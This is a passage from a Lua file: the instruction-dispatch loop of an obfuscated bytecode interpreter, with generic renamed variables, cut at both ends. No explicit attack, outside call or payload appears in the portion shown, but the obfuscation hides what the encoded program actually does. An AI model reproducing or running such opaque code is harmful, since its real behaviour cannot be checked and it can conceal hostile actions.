                                    net_c[net_a[2]] = net_f[net_a[3]]
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_c[net_a[2]] = net_a[3]
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_e = net_a[2]
                                    net_c[net_e](net_c[net_e + 1])
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_e = net_a[2]
                                    net_k = {}
                                    for net_a = 1, #net_j do
                                        net_l = net_j[net_a]
                                        for net_a = 0, #net_l do
                                            net_h = net_l[net_a]
                                            net_i = net_h[1]
                                            net_g = net_h[2]
                                            if net_i == net_c and net_g >= net_e then
                                                net_k[net_g] = net_i[net_g]
                                                net_h[1] = net_k
                                            end
                                        end
                                    end
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_b = net_a[3]
                                else
                                    for net_a = net_a[2], net_a[3] do
                                        net_c[net_a] = nil
                                    end
                                end
                            elseif net_e > 23 then
                                net_c[net_a[2]] = (net_a[3] ~= 0)
                            else
                                do
                                    return net_c[net_a[2]]
                                end
                            end
                        elseif net_e <= 28 then
                            if net_e <= 26 then
                                if net_e > 25 then
                                    if (net_c[net_a[2]] <= net_c[net_a[4]]) then
                                        net_b = net_a[3]
                                    else
                                        net_b = net_b + 1
                                    end
                                else
                                    local net_a = net_a[2]
                                    do
                                        return net_g(net_c, net_a, net_h)
                                    end
                                end
                            elseif net_e == 27 then
                                net_c[net_a[2]] = net_k[net_a[3]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_k[net_a[3]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                do
                                    return
                                end
                            else
                                local net_h = net_p[net_a[3]]
                                local net_g
                                local net_e = {}
                                net_g =
                                    net_q(
                                    {},
                                    {__index = function(net_b, net_a)
                                            local net_a = net_e[net_a]
                                            return net_a[1][net_a[2]]
                                        end, __newindex = function(net_c, net_a, net_b)
                                            local net_a = net_e[net_a]
                                            net_a[1][net_a[2]] = net_b
                                        end}
                                )
                                for net_f = 1, net_a[4] do
                                    net_b = net_b + 1
                                    local net_a = net_d[net_b]
                                    if net_a[1] == 89 then
                                        net_e[net_f - 1] = {net_c, net_a[3]}
                                    else
                                        net_e[net_f - 1] = {net_k, net_a[3]}
                                    end
                                    net_j[#net_j + 1] = net_e
                                end
                                net_c[net_a[2]] = net_m(net_h, net_g, net_f)
                            end
                        elseif net_e <= 30 then
                            if net_e > 29 then
                                local net_a = net_a[2]
                                net_c[net_a] = net_c[net_a](net_c[net_a + 1])
                            else
                                local net_g
                                local net_e
                                net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_f[net_a[3]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = {}
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_f[net_a[3]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_a[3]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_a[3]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_e = net_a[2]
                                net_g = net_c[net_e]
                                for net_a = net_e + 1, net_a[3] do
                                    net_i(net_g, net_c[net_a])
                                end
                            end
                        elseif net_e <= 31 then
                            do
                                return
                            end
                        elseif net_e > 32 then
                            do
                                return
                            end
                        else
                            local net_b = net_a[2]
                            do
                                return net_c[net_b](net_g(net_c, net_b + 1, net_a[3]))
                            end
                        end
                    elseif net_e <= 50 then
                        if net_e <= 41 then
                            if net_e <= 37 then
                                if net_e <= 35 then
                                    if net_e == 34 then
                                        net_c[net_a[2]] = net_f[net_a[3]]
                                    else
                                        local net_e
                                        net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                                        net_b = net_b + 1
                                        net_a = net_d[net_b]
                                        net_c[net_a[2]] = net_c[net_a[3]]
                                        net_b = net_b + 1
                                        net_a = net_d[net_b]
                                        net_c[net_a[2]] = net_c[net_a[3]]
                                        net_b = net_b + 1
                                        net_a = net_d[net_b]
                                        net_e = net_a[2]
                                        net_c[net_e] = net_c[net_e](net_g(net_c, net_e + 1, net_a[3]))
                                        net_b = net_b + 1
                                        net_a = net_d[net_b]
                                        if not net_c[net_a[2]] then
                                            net_b = net_b + 1
                                        else
                                            net_b = net_a[3]
                                        end
                                    end
                                elseif net_e == 36 then
                                    local net_h
                                    local net_g
                                    local net_e
                                    net_c[net_a[2]] = net_f[net_a[3]]
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_c[net_a[2]] = net_f[net_a[3]]
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_c[net_a[2]] = net_f[net_a[3]]
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_c[net_a[2]] = net_c[net_a[3]] / net_c[net_a[4]]
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_e = net_a[2]
                                    net_c[net_e] = net_c[net_e](net_c[net_e + 1])
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_c[net_a[2]] = net_a[3]
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_e = net_a[2]
                                    net_g = net_c[net_e]
                                    net_h = net_c[net_e + 2]
                                    if (net_h > 0) then
                                        if (net_g > net_c[net_e + 1]) then
                                            net_b = net_a[3]
                                        else
                                            net_c[net_e + 3] = net_g
                                        end
                                    elseif (net_g < net_c[net_e + 1]) then
                                        net_b = net_a[3]
                                    else
                                        net_c[net_e + 3] = net_g
                                    end
                                else
                                    local net_a = net_a[2]
                                    local net_d, net_b = net_n(net_c[net_a](net_c[net_a + 1]))
                                    net_h = net_b + net_a - 1
                                    local net_b = 0
                                    for net_a = net_a, net_h do
                                        net_b = net_b + 1
                                        net_c[net_a] = net_d[net_b]
                                    end
                                end
                            elseif net_e <= 39 then
                                if net_e == 38 then
                                    if (net_c[net_a[2]] ~= net_c[net_a[4]]) then
                                        net_b = net_b + 1
                                    else
                                        net_b = net_a[3]
                                    end
                                else
                                    net_f[net_a[3]] = net_c[net_a[2]]
                                end
                            elseif net_e > 40 then
                                if (net_c[net_a[2]] == net_a[4]) then
                                    net_b = net_b + 1
                                else
                                    net_b = net_a[3]
                                end
                            else
                                local net_d = net_a[2]
                                local net_e = net_c[net_d]
                                local net_f = net_c[net_d + 2]
                                if (net_f > 0) then
                                    if (net_e > net_c[net_d + 1]) then
                                        net_b = net_a[3]
                                    else
                                        net_c[net_d + 3] = net_e
                                    end
                                elseif (net_e < net_c[net_d + 1]) then
                                    net_b = net_a[3]
                                else
                                    net_c[net_d + 3] = net_e
                                end
                            end
                        elseif net_e <= 45 then
                            if net_e <= 43 then
                                if net_e > 42 then
                                    local net_b = net_a[2]
                                    net_c[net_b] = net_c[net_b](net_g(net_c, net_b + 1, net_a[3]))
                                else
                                    local net_e
                                    net_c[net_a[2]] = net_c[net_a[3]]
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_c[net_a[2]] = net_a[3]
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_c[net_a[2]] = (net_a[3] ~= 0)
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_e = net_a[2]
                                    net_c[net_e](net_g(net_c, net_e + 1, net_a[3]))
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_c[net_a[2]] = net_f[net_a[3]]
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_c[net_a[2]] = net_c[net_a[3]]
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_c[net_a[2]] = net_a[3]
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_c[net_a[2]] = (net_a[3] ~= 0)
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_e = net_a[2]
                                    net_c[net_e](net_g(net_c, net_e + 1, net_a[3]))
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_c[net_a[2]][net_a[3]] = net_a[4]
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_c[net_a[2]][net_a[3]] = net_a[4]
                                end
                            elseif net_e > 44 then
                                local net_g
                                local net_e
                                net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_e = net_a[2]
                                net_g = net_c[net_a[3]]
                                net_c[net_e + 1] = net_g
                                net_c[net_e] = net_g[net_a[4]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_e = net_a[2]
                                net_c[net_e](net_c[net_e + 1])
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_f[net_a[3]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_e = net_a[2]
                                net_c[net_e] = net_c[net_e]()
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_f[net_a[3]] = net_c[net_a[2]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_b = net_a[3]
                            else
                                if not net_c[net_a[2]] then
                                    net_b = net_b + 1
                                else
                                    net_b = net_a[3]
                                end
                            end
                        elseif net_e <= 47 then
                            if net_e == 46 then
                                local net_e
                                net_c[net_a[2]] = net_f[net_a[3]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_f[net_a[3]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_f[net_a[3]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_f[net_a[3]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_c[net_a[3]] / net_c[net_a[4]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_e = net_a[2]
                                net_c[net_e] = net_c[net_e](net_c[net_e + 1])
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_c[net_a[3]] * net_c[net_a[4]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_c[net_a[3]] - net_c[net_a[4]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_f[net_a[3]] = net_c[net_a[2]]
                            else
                                net_c[net_a[2]][net_a[3]] = net_c[net_a[4]]
                            end
                        elseif net_e <= 48 then
                            local net_b = net_a[2]
                            local net_d = net_c[net_b]
                            for net_a = net_b + 1, net_a[3] do
                                net_i(net_d, net_c[net_a])
                            end
                        elseif net_e == 49 then
                            for net_a = net_a[2], net_a[3] do
                                net_c[net_a] = nil
                            end
                        else
                            net_c[net_a[2]]()
                        end
                    elseif net_e <= 58 then
                        if net_e <= 54 then
                            if net_e <= 52 then
                                if net_e > 51 then
                                    local net_i
                                    local net_j, net_k
                                    local net_e
                                    net_c[net_a[2]] = net_c[net_a[3]]
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_c[net_a[2]] = net_f[net_a[3]]
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_c[net_a[2]] = net_c[net_a[3]]
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_e = net_a[2]
                                    net_j, net_k = net_n(net_c[net_e](net_c[net_e + 1]))
                                    net_h = net_k + net_e - 1
                                    net_i = 0
                                    for net_a = net_e, net_h do
                                        net_i = net_i + 1
                                        net_c[net_a] = net_j[net_i]
                                    end
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_e = net_a[2]
                                    do
                                        return net_c[net_e](net_g(net_c, net_e + 1, net_h))
                                    end
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_e = net_a[2]
                                    do
                                        return net_g(net_c, net_e, net_h)
                                    end
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    do
                                        return
                                    end
                                else
                                    net_c[net_a[2]] = net_m(net_p[net_a[3]], nil, net_f)
                                end
                            elseif net_e == 53 then
                                local net_h = net_p[net_a[3]]
                                local net_g
                                local net_e = {}
                                net_g =
                                    net_q(
                                    {},
                                    {__index = function(net_b, net_a)
                                            local net_a = net_e[net_a]
                                            return net_a[1][net_a[2]]
                                        end, __newindex = function(net_c, net_a, net_b)
                                            local net_a = net_e[net_a]
                                            net_a[1][net_a[2]] = net_b
                                        end}
                                )
                                for net_f = 1, net_a[4] do
                                    net_b = net_b + 1
                                    local net_a = net_d[net_b]
                                    if net_a[1] == 89 then
                                        net_e[net_f - 1] = {net_c, net_a[3]}
                                    else
                                        net_e[net_f - 1] = {net_k, net_a[3]}
                                    end
                                    net_j[#net_j + 1] = net_e
                                end
                                net_c[net_a[2]] = net_m(net_h, net_g, net_f)
                            else
                                net_c[net_a[2]] = net_c[net_a[3]] * net_c[net_a[4]]
                            end
                        elseif net_e <= 56 then
                            if net_e == 55 then
                                local net_a = net_a[2]
                                net_c[net_a](net_c[net_a + 1])
                            else
                                if (net_c[net_a[2]] == net_a[4]) then
                                    net_b = net_b + 1
                                else
                                    net_b = net_a[3]
                                end
                            end
                        elseif net_e > 57 then
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_c[net_a[3]] + net_c[net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_f[net_a[3]] = net_c[net_a[2]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            if (net_c[net_a[2]] <= net_c[net_a[4]]) then
                                net_b = net_a[3]
                            else
                                net_b = net_b + 1
                            end
                        else
                            local net_d = net_a[2]
                            local net_e = {net_c[net_d](net_c[net_d + 1])}
                            local net_b = 0
                            for net_a = net_d, net_a[4] do
                                net_b = net_b + 1
                                net_c[net_a] = net_e[net_b]
                            end
                        end
                    elseif net_e <= 62 then
                        if net_e <= 60 then
                            if net_e > 59 then
                                if not net_c[net_a[2]] then
                                    net_b = net_b + 1
                                else
                                    net_b = net_a[3]
                                end
                            else
                                net_c[net_a[2]] = net_c[net_a[3]] + net_c[net_a[4]]
                            end
                        elseif net_e > 61 then
                            local net_d = net_a[2]
                            local net_f = net_c[net_d + 2]
                            local net_e = net_c[net_d] + net_f
                            net_c[net_d] = net_e
                            if (net_f > 0) then
                                if (net_e <= net_c[net_d + 1]) then
                                    net_b = net_a[3]
                                    net_c[net_d + 3] = net_e
                                end
                            elseif (net_e >= net_c[net_d + 1]) then
                                net_b = net_a[3]
                                net_c[net_d + 3] = net_e
                            end
                        else
                            local net_e
                            net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_e = net_a[2]
                            net_c[net_e](net_c[net_e + 1])
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = {}
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]][net_a[3]] = net_c[net_a[4]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            net_c[net_a[2]] = net_f[net_a[3]]
                            net_b = net_b + 1
                            net_a = net_d[net_b]
                            if net_c[net_a[2]] then
                                net_b = net_b + 1
                            else
                                net_b = net_a[3]
                            end
                        end
                    elseif net_e <= 64 then
                        if net_e > 63 then
                            local net_b = net_a[2]
                            local net_e = {net_c[net_b](net_c[net_b + 1])}
                            local net_d = 0
                            for net_a = net_b, net_a[4] do
                                net_d = net_d + 1
                                net_c[net_a] = net_e[net_d]
                            end
                        else
                            local net_d = net_a[2]
                            local net_f = net_c[net_d + 2]
                            local net_e = net_c[net_d] + net_f
                            net_c[net_d] = net_e
                            if (net_f > 0) then
                                if (net_e <= net_c[net_d + 1]) then
                                    net_b = net_a[3]
                                    net_c[net_d + 3] = net_e
                                end
                            elseif (net_e >= net_c[net_d + 1]) then
                                net_b = net_a[3]
                                net_c[net_d + 3] = net_e
                            end
                        end
                    elseif net_e <= 65 then
                        local net_h
                        local net_e
                        net_e = net_a[2]
                        net_c[net_e] = net_c[net_e]()
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]][net_a[3]] = net_a[4]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_f[net_a[3]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_e = net_a[2]
                        net_h = net_c[net_a[3]]
                        net_c[net_e + 1] = net_h
                        net_c[net_e] = net_h[net_a[4]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_a[3]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_e = net_a[2]
                        net_c[net_e] = net_c[net_e](net_g(net_c, net_e + 1, net_a[3]))
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_f[net_a[3]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]][net_a[3]] = net_c[net_a[4]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_f[net_a[3]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_f[net_a[3]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_a[3]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_a[3] / net_a[4]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_e = net_a[2]
                        net_c[net_e](net_g(net_c, net_e + 1, net_a[3]))
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_f[net_a[3]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_f[net_a[3]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_a[3]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_a[3] / net_a[4]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_e = net_a[2]
                        net_c[net_e](net_g(net_c, net_e + 1, net_a[3]))
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_f[net_a[3]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_a[3] / net_a[4]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_e = net_a[2]
                        net_c[net_e](net_c[net_e + 1])
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_f[net_a[3]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_e = net_a[2]
                        net_h = net_c[net_a[3]]
                        net_c[net_e + 1] = net_h
                        net_c[net_e] = net_h[net_a[4]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_a[3]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_e = net_a[2]
                        net_c[net_e] = net_c[net_e](net_g(net_c, net_e + 1, net_a[3]))
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_e = net_a[2]
                        net_h = net_c[net_a[3]]
                        net_c[net_e + 1] = net_h
                        net_c[net_e] = net_h[net_a[4]]
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_e = net_a[2]
                        net_c[net_e](net_c[net_e + 1])
                        net_b = net_b + 1
                        net_a = net_d[net_b]
                        net_b = net_a[3]
                    elseif net_e == 66 then
                        if (net_c[net_a[2]] == net_c[net_a[4]]) then
                            net_b = net_b + 1
                        else
                            net_b = net_a[3]
                        end
                    else
                        if net_c[net_a[2]] then
                            net_b = net_b + 1
                        else
                            net_b = net_a[3]
                        end
                    end
                elseif net_e <= 101 then
                    if net_e <= 84 then
                        if net_e <= 75 then
                            if net_e <= 71 then
                                if net_e <= 69 then
                                    if net_e > 68 then
                                        local net_e
                                        net_c[net_a[2]] = net_k[net_a[3]]
                                        net_b = net_b + 1
                                        net_a = net_d[net_b]
                                        net_c[net_a[2]] = net_c[net_a[3]]
                                        net_b = net_b + 1
                                        net_a = net_d[net_b]
                                        net_c[net_a[2]] = net_c[net_a[3]]
                                        net_b = net_b + 1
                                        net_a = net_d[net_b]
                                        net_e = net_a[2]
                                        net_c[net_e](net_g(net_c, net_e + 1, net_a[3]))
                                        net_b = net_b + 1
                                        net_a = net_d[net_b]
                                        net_c[net_a[2]] = net_f[net_a[3]]
                                    else
                                        if (net_c[net_a[2]] ~= net_c[net_a[4]]) then
                                            net_b = net_b + 1
                                        else
                                            net_b = net_a[3]
                                        end
                                    end
                                elseif net_e == 70 then
                                    local net_a = net_a[2]
                                    net_c[net_a] = net_c[net_a]()
                                else
                                    net_c[net_a[2]] = net_c[net_a[3]] - net_c[net_a[4]]
                                end
                            elseif net_e <= 73 then
                                if net_e > 72 then
                                    if (net_c[net_a[2]] ~= net_a[4]) then
                                        net_b = net_b + 1
                                    else
                                        net_b = net_a[3]
                                    end
                                else
                                    local net_g
                                    local net_i
                                    local net_h
                                    local net_e
                                    net_f[net_a[3]] = net_c[net_a[2]]
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_c[net_a[2]] = net_f[net_a[3]]
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_e = net_a[2]
                                    net_h = net_c[net_a[3]]
                                    net_c[net_e + 1] = net_h
                                    net_c[net_e] = net_h[net_a[4]]
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_e = net_a[2]
                                    net_c[net_e] = net_c[net_e](net_c[net_e + 1])
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_c[net_a[2]] = net_f[net_a[3]]
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_c[net_a[2]] = net_c[net_a[3]]
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_e = net_a[2]
                                    net_i = {net_c[net_e](net_c[net_e + 1])}
                                    net_g = 0
                                    for net_a = net_e, net_a[4] do
                                        net_g = net_g + 1
                                        net_c[net_a] = net_i[net_g]
                                    end
                                    net_b = net_b + 1
                                    net_a = net_d[net_b]
                                    net_b = net_a[3]
                                end
                            elseif net_e == 74 then
                                local net_b = net_a[2]
                                net_c[net_b](net_g(net_c, net_b + 1, net_a[3]))
                            else
                                net_b = net_a[3]
                            end
                        elseif net_e <= 79 then
                            if net_e <= 77 then
                                if net_e == 76 then
                                    local net_a = net_a[2]
                                    net_h = net_a + net_o - 1
                                    for net_b = net_a, net_h do
                                        local net_a = net_l[net_b - net_a]
                                        net_c[net_b] = net_a
                                    end
                                else
                                    local net_b = net_a[2]
                                    local net_d = net_c[net_a[3]]
                                    net_c[net_b + 1] = net_d
                                    net_c[net_b] = net_d[net_a[4]]
                                end
                            elseif net_e > 78 then
                                net_c[net_a[2]] = net_a[3]
                            else
                                net_c[net_a[2]] = net_k[net_a[3]]
                            end
                        elseif net_e <= 81 then
                            if net_e == 80 then
                                net_c[net_a[2]]()
                            else
                                local net_h
                                local net_e
                                net_c[net_a[2]] = net_a[3]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_f[net_a[3]] = net_c[net_a[2]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_f[net_a[3]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_a[3]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_f[net_a[3]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_e = net_a[2]
                                net_c[net_e] = net_c[net_e](net_g(net_c, net_e + 1, net_a[3]))
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_f[net_a[3]] = net_c[net_a[2]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_f[net_a[3]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]][net_a[3]] = net_a[4]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_f[net_a[3]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_e = net_a[2]
                                net_h = net_c[net_a[3]]
                                net_c[net_e + 1] = net_h
                                net_c[net_e] = net_h[net_a[4]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_a[3]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_e = net_a[2]
                                net_c[net_e](net_g(net_c, net_e + 1, net_a[3]))
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_f[net_a[3]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_f[net_a[3]] = net_c[net_a[2]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_a[3]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_f[net_a[3]] = net_c[net_a[2]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = (net_a[3] ~= 0)
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_f[net_a[3]] = net_c[net_a[2]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = (net_a[3] ~= 0)
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_f[net_a[3]] = net_c[net_a[2]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_f[net_a[3]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_e = net_a[2]
                                net_c[net_e] = net_c[net_e]()
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_f[net_a[3]] = net_c[net_a[2]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_f[net_a[3]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_e = net_a[2]
                                net_h = net_c[net_a[3]]
                                net_c[net_e + 1] = net_h
                                net_c[net_e] = net_h[net_a[4]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_e = net_a[2]
                                net_c[net_e](net_c[net_e + 1])
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_f[net_a[3]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_e = net_a[2]
                                net_h = net_c[net_a[3]]
                                net_c[net_e + 1] = net_h
                                net_c[net_e] = net_h[net_a[4]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_a[3]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_e = net_a[2]
                                net_c[net_e] = net_c[net_e](net_g(net_c, net_e + 1, net_a[3]))
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                                net_b = net_b + 1
                                net_a = net_d[net_b]
                                net_e = net_a[2]
                                net_h = net_c[net_a[3]]
                                net_c[net_e + 1] = net_h
                                net_c[net_e] = net_h[net_a[4]]
                            end
                        elseif net_e <= 82 then
                            local net_g
                            local net_e
                            net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
